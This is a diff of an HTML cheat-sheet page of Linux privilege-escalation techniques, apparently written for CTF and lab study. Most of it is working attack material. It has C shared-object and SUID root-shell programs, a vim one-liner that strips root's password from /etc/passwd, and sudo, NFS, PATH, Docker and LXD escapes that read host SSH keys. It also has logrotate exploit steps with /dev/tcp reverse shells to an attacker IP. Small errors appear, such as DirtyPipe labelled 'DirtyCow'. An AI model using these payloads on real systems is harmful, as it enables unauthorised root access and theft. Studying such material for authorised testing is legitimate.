@@ -110,21 +110,66 @@
                     <h2 id="Sudo & SUID">Sudo & SUID</h2>
                     <ul>
                         <p>If anything was found, check sudo version. Some times there are CVEs associated</p>
-                        <h3> Watch out for env_keep+=LD_PRELOAD </h3>
+                        <pre><code class="language-bash">sudo -V | head -n1</code></pre>
+
                         <pre><code class="language-bash">sudo -l</code></pre>
                         <ul>
-                            <h4>SETENV</h4>
-                            <p>In case you have SETENV privilege over a anything you could run sudo command over it and set environmental variables that might be useful </p>
-                            
-                            <h4>(ALL, !root)</h4>
-                            <p>When we see this in the sudoers file means that our user is able to execute a binary as any user less root. In that case we can try to specify root user using the suid</p>
-                            <pre><code class="language-bash">sudo -u#0 command
-sudo -u#-1 command</code></pre>
                             
 
+                            <h4>SETENV</h4>
+                            <ul>
+                                <p>In case you have SETENV privilege over a anything you could run sudo command over it and set environmental variables that might be useful</p>
+                                
+                            </ul>
+                            <h4>(ALL, !root)</h4>
+                            <ul>
+                            <p>When we see this in the sudoers file means that our user is able to execute a binary as any user less root. In that case we can try to specify root user using the suid</p>
+                            <b>This only affects all versions below 1.8.28</b>
+                            <pre><code class="language-bash">sudo -u#0 command
+sudo -u#-1 command</code></pre>
+                            </ul>
+                            <h4>LD_PRELOAD</h4>
+                            <ul>
+                                <p>By default the LD_PRELOAD is disabled but in case we found the following <b>env_keep+=LD_PRELOAD</b> we may be able to escalate privielges</p>
+                                <p>Create a <b>c</b> script to escalate your privielges</p>
+                                <pre><code class="language-bash">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}</code></pre>
+                                <p>Compile your script</p>
+                                <pre><code class="language-bash">gcc -fPIC -shared -o root.so root.c -nostartfiles</code></pre>
+                                <p>Move script to to /tmp/</p>
+                                <p>Escalate privielges loading your script and performing a sudo over the command you are able to use root. Taking the following example as the sudo -l output</p>
+                                <pre><code class="language-bash">#sudo -l output
+User daniel.carter may run the following commands on NIX02:
+    (root) NOPASSWD: /usr/bin/openssl </code></pre>
+                                <pre><code class="language-bash">sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl</code></pre>
+
+                            </ul>
+
                         </ul>
-                        <h3> SUID propietary execution </h3>                          
-                        <pre><code class="language-bash">find / -type f -perm -4000 2>/dev/null</code></pre>
+                        <h3> SUID/SGID propietary execution </h3>
+                        <ul>
+                            <li><b>SUID</b> The prcoess runs with the permissions of the owner </li>
+                            <pre><code class="language-bash">-rwsr-xr-x 1 root root file.txt  #Take a look where the s is</code></pre>
+                            <p>List files with SUID (In this case we are filtering by root user <b>but we can remove it</b>)</p>
+                            <pre><code class="language-bash">find / -type f -user root -perm -4000 2>/dev/null</code></pre>
+                            <br>
+                            <li><b>SUID</b> The process runs with the permissions of the group owner of the file</li>
+                            <pre><code class="language-bash">-rwxr-sr-x 1 root adm file.txt  #Take a look where the s is</code></pre>
+                            <pre><code class="language-bash">find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null</code></pre>
+                            <p></p>
+                        </ul>                     
+                        <p>We can use the following command to filter for the </p>
+
+                        find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
                         <h3>Find world-executable folders </h3>
                         <pre><code class="language-bash">find / -type d -writable 2>/dev/null</code></pre>
                     </ul> 
@@ -135,7 +180,19 @@ sudo -u#-1 command</code></pre>
                     <ul>
                         <h3> Check for caps </h3>
                         <pre><code class="language-bash">getcap -r / 2>/dev/null</code></pre>
-                        <p> Sometimes this command will not work so you have to find the binary manually</p>
+                        <p> Sometimes this command will not work so you can use the following which search for getcap in multiple directories</p>
+                        <pre><code class="language-bash">find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;</code></pre>
+                        <p>There are several linux capabilities that can be used to escalte user's privilege to root</p>
+                        <ul>
+                            <li><b>cap_setuid</b> Allows to change the UID of a process. Root UID is 0</li>
+                            <li><b>cap_setgid</b> Allows to change the GID of a process  Root UID is 0</li>
+                            <li><b>cap_sys_admin</b> Very dangerous since allows many things almos equivalent to root</li>
+                            <li><b>cap_dac_override</b> Allows to bypass the UAC of files allowing you read and write any file</li>
+                            <p>Here goes an example where we have cap_dac_override and we modify the /etc/passwd in order to remove root password</p>
+                            <pre><code class="language-bash">echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd</code></pre>
+                        </ul>
+
+                        <p></p>
                     </ul> 
                 </div>
 
@@ -158,46 +215,52 @@ sudo -u#-1 command</code></pre>
                     <ul>
                         <p> ⚠️WARNING!! This process may vary depending of the CTF</p>
                         <h3> Steps </h3>
-                        <h4> 1. Explore $PATH variable and look for a directory where you can write</h4>
-                        <pre><code class="language-bash">echo %PATH</code></pre>
-                        <h4> 2. Write a simple script</h4>
-                        <pre><code class="language-c">#include &lt;unistd.h&gt;
+                        <p>First you need to find a binary which uses relative paths for example</p>
+                        <pre><code class="language-bash">cp file1 file2
+tar -xvfz file
+sudo mv file1 file2</code></pre>
+                        <p>In this case since we are not especifying the absolute path for the binary we could hijack it</p>
+                        <p>Find a directory where you can write</p>    
+                        <pre><code class="language-bash">find / -type d -writable 2>/dev/null</code></pre>
+                        <p>Situate that folder the first in the PATH, In order to execute that one the first</p>
+                        <pre><code class="language-bash">export PATH=/tmp:$PATH  #/tmp is the writable folder you found</code></pre>    
+                        <p>Write your malicious script creating a file with the name of the command you</p>
+                        <pre><code class="language-c">#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
 void main(){
     setuid(0);
     setgid(0);
-    system("thm");
+    system("/bin/bash");
 }    </code></pre>
-                        <h4> 3. Compile the script</h4>
-                        <pre><code class="language-bash">gcc path_exp.c -o exploit -w</code></pre>
-                        <pre><code class="language-bash">chmod +s exploit</code></pre>
-                        <h4> 4. Find for a writeable folder under path structure</h4>
-                        <pre><code class="language-bash">find / -writable 2>/dev/null</code></pre>
-                        <h4> 4.1. In case you can't find a directory which is un  $PATH variable you can add your own with the following command</h4>
-                        <pre><code class="language-bash">export PATH=/tmp:$PATH</code></pre>
-                        <p>In case you dont want to make it permanent</p>
-                        <pre><code class="language-bash">PATH=/path/where/you/maliciousexecutable/is:$PATH</code></pre>
-                        <h4> 5. Create the exploit to become root, must be with the same name as the C script </h4>
-                        <pre><code class="language-bash">echo "/bin/bash" > thm</code></pre>
-                        <pre><code class="language-bash">chmod 777 thm</code></pre>
-                        <h4> 6. Run the script </h4>
-                        <pre><code class="language-bash">./exploit</code></pre>
+                       
+                        <p>Compile the C code and run the binary we first found in order to execute your malicious payload</p>  
+                    </ul>
+                </div>
+
+                <div class="notion-body">
+                    <h2 id="Library Hijacking">Library Hijacking</h2>
+                    <ul>
+                        <p>Check for more information about python library hijacking</p>
+                        <a class="cherry-banner" href="/H4ckV4ult/pages/protocols/python.html">
+                            <h2>Check for more information ↗️</h2>
+                        </a>
                     </ul> 
                 </div>
 
                 <div class="notion-body">
-                    <h2 id="Wildcard Abuse">Wildcard Abuse</h2>
+                    <h2 id="Escaping restricted shells">Escaping restricted shells</h2>
                     <ul>
-                        <p>In case you found a cronjob that does the following, which in this case it's archiving all content from /home/htb-student every minute. You have found gold</p>
-                        <pre><code class="language-bash">*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *</code></pre>
-                        <p>The thing here is the use of <b>*</b> which in this case we can trick by creating files which have parameter names just like this</p>
-                        <pre><code class="language-bash">touch --checkpoint=1
-touch --checkpoint-action=exec=sh root.sh</code></pre>
-                        <p>And the root.sh file which is the exploit</p>
-                        <pre><code class="language-bash">echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh</code></pre>
-                        
-                        <p>This way the resulting command will be</p>   
-                        <pre><code class="language-bash">cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh</code></pre>
-                        <p>And based on how tar works setting the checkpoint and the checkpoint action will execute the root.sh performing a modification into the sudoers file and grating our user as root privileges</p>
+                        <p>In some cases you'll find out that you land on a shell which is restricted, there are some bypases we can perform. Some payloads are</p>
+                        <pre><code class="language-bash">ls -l `pwd`</code></pre>
+                        <p>Using... between commands</p>
+                        <pre><code class="language-bash">| ; && `</code></pre>
+                        <p>Modifying or creating environment variables</p>
+                        <p>In rbash you can list the available commands by doing:</p>
+                        <pre><code class="language-bash">compgen -c</code></pre>
+                        <p>A basic way to scape is by connecting through ssh by using <b>--noprofile</b></p>
+                        <pre><code class="language-bash"> ssh psj@server_name -t "bash --noprofile"</code></pre>
                     </ul> 
                 </div>
 
@@ -205,24 +268,42 @@ touch --checkpoint-action=exec=sh root.sh</code></pre>
                     <h2 id="Privilege scalation: NFS">Privilege scalation: NFS</h2>
                     <ul>
                         <h3> Steps </h3>
-                        <h4> 1. Check for "no_root_squash" in /etc/exports file </h4>
+                        <p> 1. Check for "no_root_squash" in /etc/exports file. Which allows clients to upload files as root</p>
                         <pre><code class="language-bash">cat /etc/exports</code></pre>
-                        <h4> 2. Write a simple script</h4>
+                        <p> 2. Write a simple script</p>
                         <pre><code class="language-c">#include &lt;unistd.h&gt;
-int main(){
-    setuid(0);
-    setgid(0);
-    system("/bin/bash");
-    return 0;
-}    </code></pre>
-                        <h4> 3. Compile the script</h4>
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}</code></pre>
+                        <p> 3. Compile the script and give the SUID in order to run it as root later</p>
                         <pre><code class="language-bash">gcc path_exp.c -o exploit -w</code></pre>                 
                         <pre><code class="language-bash">chmod +s </code></pre>
-                        <h4> 4. Run script</h4>
+                        <p> 4. Copy the script to the NFS</p>
+                        <pre><code class="language-bash">cp shell /mnt</code></pre>
+                        <p> 5. Access the mounted directory from the target system where you don't have privielge and locate the shell you created</h4>
+                        <p> 6. Run exploit and enjoy</p>
                         <pre><code class="language-bash">./exploit</code></pre>                 
                     </ul> 
                 </div>
 
+                <div class="notion-body">
+                    <h2 id="Tmux session hijacking">Tmux session hijacking</h2>
+                    <ul>
+                        <p>In some cases it may be possible that a user has a tmux session running with elevated permissions. We can check tmux processes by doing</p>
+                        <pre><code class="language-bash">ps aux | grep tmux</code></pre>
+                        <p> Check permissions of that tmux by doing over it</p>
+                        <pre><code class="language-c">ls -la /tmux_name </code></pre>
+                        <p>Attempt to hijack it by doing</p>
+                        <pre><code class="language-bash">tmux -S /shareds</code></pre>    
+                        <p>In case you are't able to you it may be possible due your user is not in the same group as previously seen in the <b>ls -la</b></p>             
+                    </ul> 
+                </div>
 
                     <h2 id="Networking">Networking</h2>
                     <ul>
@@ -264,7 +345,14 @@ int main(){
                         </ul>
                     </ul>
 
-                    <h2 id="CVE-2021-3560 - Polkit">CVE-2021-3560 - Polkit</h2>
+                    <h2 id="Polkit">Polkit</h2>
+                    <ul>
+                    <p>Here is a list of worth checking CVEs</p>
+                    <h3>CVE-2021-4034</h3>
+                    <ul>
+                        <p>POC <a class="notion-link" href="https://github.com/arthepsy/CVE-2021-4034">here</a></p>
+                    </ul>
+                    <h3>CVE-2021-3560</h3>
                     <ul>
                         <p>During privilege escalation you may find polkit version <b>0.113</b> and previous are afected by a vulnerability which will add a new user to the server with sudo permisions</p>
                         <p>This is due curious behaviour of polkit software which it's function defines and controls system-wide privielges </p>
@@ -276,6 +364,48 @@ int main(){
                         <p>To check polkit version use (Ubuntu, debian)</p>
                         <pre><code class="language-bash">dpkg -l | grep policykit-1
 rpm -qa</code></pre>
+                    </ul>
+                    </ul>
+                    
+                    <h2 id="DirtyCow">DirtyCow</h2>
+                    <ul>
+                        <p>A vulnerability that affects all linux kernels from <b>5.8</b> to <b>5.17</b> Exploits can be found <a class="notion-link" href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">here</a></p>
+                        <p>First exploit give us a shell as root meanwhile the second allow us to execute binaries as root example of the second one: </p>
+                        <pre><code class="language-bash">./exploit-2 /usr/bin/sudo</code></pre>
+                    </ul> 
+
+                    <h2 id="Logrotate">Logrotate</h2>
+                    <ul>
+                        <p>Logrotate is a Linux tools which manages log files. The following versions are affected by a privilege escalation vulnerability</p>
+                        <pre><code class="language-bash">Debian GNU/Linux 9.5 (stretch)
+Amazon Linux 2 AMI (HVM)
+Ubuntu 18.04.1
+logrotate 3.8.6
+logrotate 3.11.0
+logrotate 3.15.0
+logrotate 3.18.0</code></pre>
+                        <p>Download the files in the github directory <a class="notion-link" href="https://github.com/whotwagner/logrotten">here</a></p>
+                        <p>Compile them <b>in the same machine you are attacking</b></p>
+                        <pre><code class="language-bash">gcc -o logrotten logrotten.c</code></pre>
+                        <p>In order to check which files are affected to logrotate you can do</p>
+                        <pre><code class="language-bash"> cat /var/lib/logrotate.status</code></pre>    
+                        <p>Create a basic payload which will give us a shell</p>
+                        <pre><code class="language-bash">echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload</code></pre>
+                        <p>Check the content of logrotate.conf</p>
+                        <pre><code class="language-bash">grep "create\|compress" /etc/logrotate.conf | grep -v "#"</code></pre>
+                        <p>Based on the result of the previous command use the following executions of the exploit</p>
+                        <pre><code class="language-bash">#create
+./logrotten -p ./payloadfile /tmp/log/pwnme.log                            
+#compress                         
+./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log</code></pre>
+                        <p>In order to execute the exploit you need to perform the following process. Open three terminals 2 in the target victim and one in your machine</p>    
+                        <p>Terminal 1: Run the exploit here</p>
+                        <pre><code class="language-bash">./logrotten -p ./payload ./backups/access.log</code></pre>
+                        <p>Switch quickly to terminal 2 and perform a modification in the .log file which is affected by logrotate</p>
+                        <pre><code class="language-bash">echo 'trigger' > backups/access.log</code></pre>
+                        <p>Go to terminal 1 and look the output of the exploit. In case the output says <b>Done!</b> wait for your shell in the third terminal which is in your machine. In case it does not say it try again changing the content you are placing in the file affected by logrotate</p>
+                        <p><b>Aditional data:</b>In case that once you get the shell it closes abruptly, just perform a tcp connection to another port in order to avoid that behaviour</p>
+                        <pre><code class="language-bash">bash -i >& /dev/tcp/10.10.14.85/6666 0>&1</code></pre>
                     </ul>  
                     
                     <h2 id="Linux Domain joined machine">Linux Domain joined machine</h2>
@@ -327,8 +457,87 @@ rpm -qa</code></pre>
                             <p>Finally use the exported ticket by issuing the <b>-k</b> flag .Example:</p>
                             <pre><code class="language-bash">smbclient //dc01/C$ -k -c ls -no-pass</code></pre>
                         </ul>
-                        
                     </ul>
+
+                    <h2 id="Privileged groups">Privileged groups</h2>
+                    <ul>
+                        <p>First check your groups by using <b>id</b> command</p>
+                        <h4>LXC / LXD group</h4>
+                        <ul>
+                            <p>LXD is similar to Docker and is Ubuntu's container manager. With this group you'll be able to obtain a shell as root</p>
+                            <p>Go to the following github repo and download the image (tar.gz) file</p>
+                            <pre><code class="language-bash">https://github.com/saghul/lxd-alpine-builder</code></pre>
+                            <p>In case you would like to create a recent image you can clone de repo and follow the steps to create it. Once you have the file transfer it to the victim</p>
+                            <p>Import the image</p>
+                            <pre><code class="language-bash">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias ubuntutemp</code></pre>
+                            <p>List images to check we did it correctly</p>
+                            <pre><code class="language-bash">lxc image list</code></pre>
+                            <p>Disables all isolation features that allow us to act on the host.</p>
+                            <pre><code class="language-bash">lxc init ubuntutemp privesc -c security.privileged=true</code></pre>
+                            <p>Add the root directory of our original machine where privesc is the name of the container</p>
+                            <pre><code class="language-bash">lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code></pre>
+                            <p>Start the container </p>
+                            <pre><code class="language-bash">lxc start privesc</code></pre>
+                            <p>Obtain a shell inside the container</p>
+                            <pre><code class="language-bash">lxc exec privesc /bin/bash #OR
+lxc exec privesc /bin/sh</code></pre>
+                            <p>In order to check the original host disk device just go to /mnt/root/</p>
+                        </ul>
+
+                        <h4>Docker group</h4>
+                        <ul>
+                            <p>In case you are in docker group youll be able to read any file on the system. By running the following command youll create a new container mounting the /root folder</p>
+                            <pre><code class="language-bash">docker run -v /root:/mnt -it ubuntu</code></pre>
+
+                            <h5>Shared folders</h5>
+                            <ul>
+                            <p>In case there is already a container, running in the server and you are able to access you should check shared folders since in some times the / host folder may be mounted and you could access the host filesystem</p>
+                            <pre><code class="language-bash">/
+/mnt/
+/data/
+/srv/</code></pre>    
+                            </ul>
+
+                            <h5>Docker socket</h5>
+                            <ul>
+                                <p>In some cases we will find a file called docker.sock which is a special file that allows us and processes to communicate with the Docker daemon. Using that file we can create a new container mounting the host filesystem</p>
+                                <p>Normally this file is located in</p>
+                                <pre><code class="language-bash">/var/run/docker.sock
+/run/docker.sock</code></pre>
+                                <p>First check if we have the docker binary if negative download it from <a class="notion-link" href="https://master.dockerproject.com/linux/x86_64/docker">here</a></p>
+                                <p>Then check if we can list containers using the socket</p>
+                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock ps</code></pre>
+                                <p>Create a new privileged container mounting the host filesystem. In case you dont have any image you can check the <b>docker ps</b> if there are other containers and use the same image or even you can do <b>docker image ls</b> to list images</p>
+                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem docker_image
+#In case your container stops just after running the command use sleep infinity
+docker -H unix:///run/docker.sock run -d --privileged -v /:/hostsystem ubuntu sleep infinity
+                                </code></pre>
+                                <p>You can list again containers to check if all was okay</p>
+                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock ps</code></pre>
+                                <p>Now access the container</p>
+                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock exec -it container_id /bin/bash</code></pre>
+                                <p>Access the host filesystem</p>
+                                <pre><code class="language-bash">cat /hostsystem/root/.ssh/id_rsa</code></pre>
+                            </ul>
+
+                            <h5>Docker socket without privileges</h5>
+                            <ul>
+                                <p>In case we are not in docker group we still be able to access host filesystem but there is one condition. <b>Docker socket must be writable</b> then we can use</p>
+                                <pre><code class="language-bash">docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash</code></pre>
+                                
+                            </ul>
+                        </ul>
+                        
+                        <h4>Disk group</h4>
+                        <ul>
+                            <p>Users within the disk group have full access to any devices contained within /dev also /dev/sda1 which is the main device. An attacker whith this privielged can use <b>debugfs</b> to access the full filesystem</p>
+                        </ul>
+
+                        <h4>ADM grup</h4>
+                        <ul>
+                            <p>Members of the adm group are able to read all logs stored in /var/log</p>
+                    </ul>
+                </ul>
         </div>
     </div>
 </body>
